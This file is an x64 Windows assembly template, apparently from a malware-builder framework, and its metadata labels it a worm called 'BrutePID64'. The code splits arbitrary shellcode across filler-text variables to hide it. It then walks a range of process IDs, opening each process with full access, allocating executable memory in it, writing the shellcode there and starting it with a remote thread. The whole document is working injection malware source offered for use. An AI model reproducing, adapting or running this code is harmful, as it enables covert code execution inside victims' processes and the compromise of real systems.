#!name##BrutePID64
#!types##worm
#!info##Assembler worm [W] [x64]. This is more for testing. It displays information about steps like opening a process, placing memory, etc. Hides shellcode in multiple text variables. Checks each PID in the specified range trying to inject shellcode into the process and run. NOTE: sometimes it can inject shellcode into a strange process and reset something.
#!system_FLAG##[W]
#!globalVar##COMPILER##mingw-x64##Compiler name
#!globalVar##OS_EXEC##win##Target system executable
#!globalVar##NO_DLL##Not include DLLs
#!processWorm##BasicAsm
#!lang##asm
#!reqFood##FOOD_text##FOOD_random_text##Text to fill code
#!reqVar##BP_start_pid##The PID number from which the process search begins.##int
#!reqVar##BP_max_pid##Last PID number of the process.##int
#!reqVar##BP_shellcode##64 bit shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
#!setVar##BP_start_pid##2100##int
#!setVar##BP_max_pid##11000##int
#!reqVar##BP_WaitTh##Using the “WaitForSingleObject” function after running shellcode.##bool
#!setVar##BP_WaitTh##False##bool
#!banned##module##starter##shadow##junk


bits 64
default rel



extern printf
extern GetLastError
extern OpenProcess
extern CloseHandle
extern VirtualAllocEx
extern WriteProcessMemory
extern CreateRemoteThread
extern WaitForSingleObject
extern ExitProcess
    
section .data
    text_exit: db "Exit Program", 10, 0
    text_build_end: db "Build code complete", 10, 0
    text_start: db "------------ Start Injection -------------", 10, 0
    text_temp: db "output: %d", 10, 0
    text_exe: db "Execute Shellcode. Shellcode len: %d bytes", 10, 0
    text_op: db "Open process PID: %d", 10, 0
    text_cp: db "---------- CLOSE PROCESS ------------", 10, 0
    text_error: db "ERROR: %d", 10, 0
    text_am: db "Try allocate memory in process", 10, 0
    text_am_addr: db "Allocate memory addr: 0x%p", 10, 0
    text_wm: db "Try write memory in process", 10, 0
    text_wm_ok: db "Writing: %d bytes", 10, 0
    text_th: db "Create Thread", 10, 0
    
    {{TOOL.build_asm_scvar(FOOD_text, BP_shellcode, "var", "var_data", "x64")}}
    
    
    
    
    var_limit: equ {{TOOL.shellcode_len(BP_shellcode)}}
    
    min_score: equ {{BP_start_pid}}
    max_score: equ {{BP_max_pid}}
    
section .bss
    spoint resq 1   ; shellcode index
    dpoint resq 1   ; data index
    scode resb {{TOOL.shellcode_len(BP_shellcode) + 16}}
    mem_pointer resq 1
    sc_addr resq 1
    
    target_player resq 1    ; process PID
    proc_handle resq 1  ;process handler
    mem_addr resq 1     ; memory address
    bytes_wr resq 1     ; counter write bytes
    
    

section .text
    global main

main:
    and rsp, -16
    call Build
    sub rsp, 32 ;shadow space
    mov rcx, text_start
    call printf
    add rsp, 32 ;restore stack
    
    
    call CheckPID
    call EXIT

CheckPID:
    lea rax, [target_player]
    mov qword [rax], min_score
    .cPID_loop:
        lea rcx, [target_player]
        mov rcx, [rcx]
        mov rbx, max_score
        cmp rcx, rbx
        je .cPID_end
        call Inject
        cmp rax, 1
        je .cPID_end
        
        lea rbx, [target_player]
        mov rax, [rbx]
        inc rax ; PID + 1
        mov [rbx], rax
        jmp .cPID_loop

    .cPID_end:
        ret

; IN : rcx - process PID
; OUT: rax - '1' success, '0' fail
Inject:
    call OpenProc
    cmp rax, 0
    je .IN_error
    call AllocMemory
    cmp rax, 0
    je .IN_error
    call WriteMem
    cmp rax, 0
    je .IN_error
    call CreateTH
    cmp rax, 0
    je .IN_error
    
    
    
    
    call CloseProc
    ; return success
    xor rax, rax
    inc rax
    ret
    
    .IN_error:
        call CloseProc
        xor rax, rax    ; return fail
        ret


CreateTH:
    sub rsp, 32 ;shadow space
    mov rcx, text_th
    call printf
    add rsp, 32 ;restore stack
    
    ;create thread
    sub rsp, 56 ; shadow space 32 bytes + 4 * args
    lea rcx, [proc_handle]
    mov rcx, [rcx]  ; [in] hProcess
    xor rdx, rdx  ;[in] lpThreadAttributes
    xor r8, r8   ;[in] dwStackSize
    lea r9, [mem_addr]
    mov r9, [r9]    ;[in] lpStartAddress
    mov qword [rsp+32], 0 ;[in] lpParameter
    mov qword [rsp+40], 0 ;[in] dwCreationFlags
    mov qword [rsp+48], 0 ;[out] lpThreadId
    call CreateRemoteThread
    add rsp, 56 ;restore stack
    cmp rax, 0
    je .cTH_error
    
{% if BP_WaitTh%}
    sub rsp, 32 ;shadow space
    mov rcx, rax
    mov rdx, 0xffffffff
    call WaitForSingleObject
    add rsp, 32 ;restore stack
{%endif%}

    xor rax, rax
    inc rax ;return success
    ret
    
    .cTH_error:
        call ERROR
        xor rax, rax    ; return fail
        ret
    


WriteMem:
    sub rsp, 32 ;shadow space
    mov rcx, text_wm
    call printf
    add rsp, 32 ;restore stack
    
    ; write memory
    sub rsp, 48 ;shadow space
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    lea rdx, [mem_addr]
    mov rdx, [rdx]
    lea r8, [scode] ; shellcode buffer addr
    mov r9, var_limit
    ; pointer to bytes_written
    lea rbx, [bytes_wr]
    mov qword [rsp + 32], rbx
    call WriteProcessMemory
    add rsp, 48 ;restore stack
    cmp rax, 0
    je .WM_error
    
    sub rsp, 32 ;shadow space
    mov rcx, text_wm_ok
    lea rdx, [bytes_wr]
    mov rdx, [rdx]
    call printf
    add rsp, 32 ;restore stack
    
    xor rax, rax
    inc rax ; return success
    ret
    
    .WM_error:
        call ERROR
        xor rax, rax    ; return fail
        ret
    
    
    
AllocMemory:
    
    sub rsp, 32 ;shadow space
    mov rcx, text_am
    call printf
    add rsp, 32  ; restore stack
    
    ; Allocate Memory
    sub rsp, 48 ; shadow space
    lea rbx, [proc_handle]
    mov rcx, [rbx]
    mov rdx, 0  ; lpAddress
    mov r8, var_limit
    mov r9, 0x00001000 | 0x00002000    ; flAllocationType = MEM_COMMIT | MEM_RESERVE
    mov qword [rsp + 32], 0x40  ; flProtect = PAGE_EXECUTE_READWRITE
    call VirtualAllocEx
    add rsp, 48 ; restore stack
    cmp rax, 0
    je .AM_error
    
    ; save memory addr
    lea rbx, [mem_addr]
    mov [rbx], rax
    
    sub rsp, 32 ; shadow space
    mov rcx, text_am_addr
    mov rdx, rax
    call printf
    add rsp, 32 ; restore stack
    
    xor rax, rax    ;return successs
    inc rax
    ret
    
    .AM_error:
        call ERROR
        xor rax, rax    ; return fail
        ret
        

; IN: rcx - process PID
; OUT: rax - '1' success, '0' fail
OpenProc:
    lea rbx, [target_player]
    mov [rbx], rcx
    
    sub rsp, 32 ;shadow space
    mov rcx, text_op
    mov rdx, [rbx]
    call printf
    add rsp, 32 ; restore stack
    
    
    ; open process
    lea rbx, [target_player]
 
    sub rsp, 32 ;shadow space
    mov rcx, 0x1F0FFF    ; PROCESS_ALL_ACCESS
    xor rdx, rdx
    mov r8, [rbx]
    call OpenProcess
    add rsp, 32 ; restore stack
    cmp rax, 0
    je .OP_error
    
    ; save process handle
    lea rbx, [proc_handle]
    mov [rbx], rax
    
    mov rax, 1  ; return success
    ret
    
    
    .OP_error:
        call ERROR
        xor rax, rax
        ret

CloseProc:
    sub rsp, 32 ;shadow space
    mov rcx, text_cp
    call printf
    add rsp, 32
    
    sub rsp, 32 ;shadow space
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    call CloseHandle
    add rsp, 32 ;restore stack
    ret 

Build:
    .build_loop:
        lea rbx, [dpoint]
        mov rcx, [rbx]
        cmp rcx, var_limit
        je .build_end
        call CheckVar
        lea rbx, [dpoint]
        mov rcx, [rbx]
        inc rcx ; var index + 1
        mov [rbx], rcx
        jmp .build_loop
        

    .build_end:
        sub rsp, 32 ;shadow space
        mov rcx, text_build_end
        call printf
        add rsp, 32 ; restore stack
        
        ret

CheckVar:
    lea rbx, [var_data]
    mov rdx, [rbx + 8 * rcx]
    xor rax, rax
    xor rcx, rcx
    .cv_loop:
        mov al, [rdx + rcx]
        cmp al, 10
        je .cv_end
        inc rcx ; index + 1
        jmp .cv_loop

    .cv_end:
        inc rcx
        mov al, [rdx + rcx]
        lea rbx, [spoint]
        mov rbx, [rbx]
        lea rdx, [scode]
        mov [rdx + rbx], al ; save part shellcode
        inc rbx     ; shellcode index + 1
        lea rcx, [spoint]
        mov [rcx], rbx
        ret       

ERROR:
    sub rsp, 32 ;shadow space
    call GetLastError
    add rsp, 32 ; restore stack
    
    sub rsp, 32 ;shadow space
    mov rcx, text_error
    mov rdx, rax
    call printf
    add rsp, 32 ;restore stack
    cmp rax, 0
    je ERROR
    ret

EXIT:
    sub rsp, 32 ;shadow space
    mov rcx, text_exit
    call printf
    add rsp, 32 ; restore stack
    
    sub rsp, 32 ;shadow space
    mov rcx, 1
    call ExitProcess